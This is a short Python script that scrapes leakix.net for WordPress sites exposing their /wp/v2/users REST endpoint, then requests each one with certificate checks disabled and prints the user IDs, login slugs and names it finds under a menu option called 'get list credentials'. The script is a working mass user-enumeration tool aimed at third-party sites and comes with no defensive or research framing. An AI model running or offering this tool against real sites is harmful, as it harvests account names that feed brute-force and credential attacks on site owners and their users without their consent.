import requests
import re
from bs4 import BeautifulSoup
from urllib3.exceptions import InsecureRequestWarning
import json


def get_start(page):
    req = requests.get('https://leakix.net/search?page={}&q=%2Bwordpress&scope=leak'.format(page))
    return BeautifulSoup(req.text, 'html.parser')

def get_url(pages: int):
    hasil = set()
    for page in range(0, pages):
        bs = get_start(page)
        for link in bs.find_all('div', {'class':'col-xl-8 text-end'}):
            for url in link.find_all('a', href=re.compile("\?[a-z\_]+\=\/wp\/v2\/users\/")):
                hasil.add(url.attrs['href'])
    return hasil

def get_listcred(page: int):
    x = get_url(page)
    for i in x:
        requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
        req = requests.get(i, verify=False)
        if req.status_code == 200 or req.status_code == 404:
            try:
                js = json.loads(req.text)
            except BaseException:
                pass
            finally:
                for hs in js:
                    print(f'ID: {hs["id"]}\nUSER: {hs["slug"]}\nNAME: {hs["name"]}\nURL: {i}')

def main():
    print("""
            [*] select mode
            [1] get list credentials + urls
            [2] get urls only
    """)
    mode = int(input('[select mode]> '))
    depe = int(input('[jumlah halaman]> '))
    
    if mode == 1:
        get_listcred(depe)
    elif mode == 2:
        res = get_url(depe)
        for i, h in enumerate(res):
            print(f'[{i}]Found --> {h}')
    else:
        print('no selected :(')

if __name__ == '__main__':
    main()
